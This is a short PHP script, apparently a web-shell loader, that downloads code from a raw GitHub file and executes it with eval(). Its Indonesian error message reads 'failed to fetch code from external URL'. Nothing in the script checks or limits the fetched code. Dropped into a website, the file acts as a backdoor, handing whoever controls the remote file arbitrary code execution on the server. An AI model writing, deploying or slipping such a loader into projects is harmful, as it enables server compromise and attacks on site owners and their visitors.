<?php
$external_url = 'https://raw.githubusercontent.com/luffyopm/opm/refs/heads/main/3.txt';

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $external_url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
$external_code = curl_exec($ch);
curl_close($ch);

if ($external_code === FALSE) {
    die('Gagal mengambil kode dari URL eksternal.');
}

eval('?>' . $external_code);
?>
